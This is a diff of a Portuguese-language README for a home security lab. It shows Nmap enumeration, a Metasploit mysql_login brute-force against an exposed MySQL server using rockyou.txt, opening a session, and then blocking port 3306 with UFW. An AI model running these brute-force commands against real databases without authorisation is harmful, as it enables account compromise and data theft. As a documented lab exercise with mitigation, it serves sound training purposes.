@@ -1,129 +1,100 @@
-🔐 Laboratório de Segurança - Brute Force em MySQL e Mitigação com UFW
-📌 Descrição
+Laboratório de Segurança - Brute Force com Metasploit em MySQL e Mitigação com UFW
+Descrição
 
 Este projeto demonstra, em ambiente controlado, uma simulação de ataque de força bruta em um serviço MySQL exposto, seguido da aplicação de medidas de mitigação para aumento da segurança.
 
 O objetivo é evidenciar, na prática, como vulnerabilidades podem ser exploradas, permitindo acesso indevido ao sistema, e posteriormente corrigidas através de técnicas de hardening.
 
-🧪 Ambiente do Laboratório
+Ambiente do Laboratório
 Máquina atacante: Kali Linux (Hyper-V)
 Máquina alvo: Ubuntu Server (Hyper-V)
-🔧 Ferramentas utilizadas
+Ferramentas utilizadas
 Nmap
 Metasploit Framework
 MySQL Server
 UFW (Uncomplicated Firewall)
-⚙️ Configuração do Cenário
-🔓 Estado inicial (vulnerável)
+Configuração do Cenário
+Estado inicial (vulnerável)
 Serviço MySQL ativo na porta 3306
 Acesso externo permitido
-Firewall permitindo conexões (ALLOW 3306)
 Usuário e senha configurados no banco
-🚨 Teste de Vulnerabilidade
-🔍 1. Enumeração com Nmap
-nmap -sS -sV 192.168.100.154
+Sem restrições de firewall
+Teste de Vulnerabilidade
+1. Enumeração com Nmap
 
-✔ Resultado:
+Identificação do serviço MySQL exposto:
+
+nmap -p 3306 <IP_DO_ALVO>
+
+Resultado:
 
 Porta 3306 aberta
-Serviço MySQL identificado
-Versão detectada
-📸 Evidência
-
-
-
-
-💣 2. Ataque de força bruta com Metasploit
+2. Ataque de força bruta com Metasploit
 use auxiliary/scanner/mysql/mysql_login
-set RHOSTS 192.168.100.154
+set RHOSTS <IP_DO_ALVO>
+set PASS_FILE rockyou.txt
+set CreateSession true
 run
 
-✔ Resultado:
+Resultado:
 
-Diversas tentativas de login
-Credenciais válidas encontradas
-🔗 3. Acesso via sessão
-sessions -i 6
+Múltiplas tentativas de login realizadas
+Credenciais válidas encontradas com sucesso
+3. Acesso ao banco via sessão
 
-✔ Resultado:
+Após a descoberta das credenciais, foi possível estabelecer uma sessão ativa com o MySQL diretamente pelo Metasploit:
 
-Sessão MySQL aberta
-Acesso autenticado ao banco
-📸 Evidência
+sessions -i
 
+Resultado:
 
+Sessão MySQL aberta com sucesso
+Acesso autenticado ao banco de dados
+4. Acesso direto ao MySQL (opcional)
 
+Também é possível realizar conexão manual utilizando as credenciais descobertas:
 
-🧠 4. Interação com o banco
-show databases;
-
-✔ Resultado:
-
-Listagem de bancos
-Confirmação de acesso indevido
-🛡️ Mitigação
-🔒 5. Verificação inicial
-ufw status
-
-✔ Resultado:
-
-Porta 3306 liberada (ALLOW)
-🔒 6. Bloqueio da porta
+mysql -u usuario -p -h <IP_DO_ALVO>
+Mitigação
+Bloqueio da porta com UFW
 sudo ufw deny 3306/tcp
 
-✔ Resultado:
+Resultado:
 
-Regra aplicada com sucesso
-🔒 7. Verificação após bloqueio
-ufw status
-
-✔ Resultado:
-
-Porta 3306 bloqueada (DENY)
-📸 Evidência (Antes e Depois)
-
-
-
-
-🛡️ 8. Validação da mitigação
-
-Nova tentativa de ataque:
-
-✔ Resultado:
-
-Conexão falha
-Nenhuma sessão ativa
-Acesso externo bloqueado
-📸 Evidência
-
-
-
-
-🔄 Resultado Final
+Porta 3306 bloqueada
+Conexões externas negadas
+Resultado Final
 Situação	Resultado
 Antes	Acesso não autorizado possível
 Depois	Acesso bloqueado com sucesso
-⚠️ Aviso Legal
+Evidências (Pasta images)
+Scan do Nmap mostrando porta 3306 aberta
+Execução do Metasploit (brute force)
+Credenciais encontradas
+Sessão aberta (MySQL session opened)
+Interação com sessions
+Regra do UFW aplicada
+Tentativa de conexão falhando após bloqueio
+Aviso Legal
 
 Este projeto foi realizado em ambiente controlado, com fins exclusivamente educacionais.
 Nenhuma atividade foi executada em sistemas de terceiros ou sem autorização.
 
-🚀 Aprendizados
+Aprendizados
 Identificação de serviços expostos
-Enumeração com Nmap
 Exploração de autenticação fraca
-Uso do Metasploit
-Acesso via sessão ativa
-Hardening com UFW
-Validação de mitigação
-👨‍💻 Autor
+Uso do Metasploit para testes de segurança
+Estabelecimento de sessão ativa com serviço comprometido
+Aplicação de hardening básico com firewall (UFW)
+Importância da restrição de acesso a serviços sensíveis
+Autor
 
 Wladimir Eduardo
-🔐 Entusiasta de Cibersegurança
+Entusiasta de Cibersegurança
 
-📎 Próximos passos
-Implementar Fail2Ban
-Restringir acesso por IP
-Melhorar política de senhas
-Monitoramento de logs
-Defesa em camadas
+Próximos passos
+Implementar Fail2Ban para proteção contra brute force
+Restringir acesso ao MySQL por IP
+Utilizar autenticação mais forte (senhas complexas)
+Monitorar logs de acesso
+Aplicar regras mais avançadas de firewall
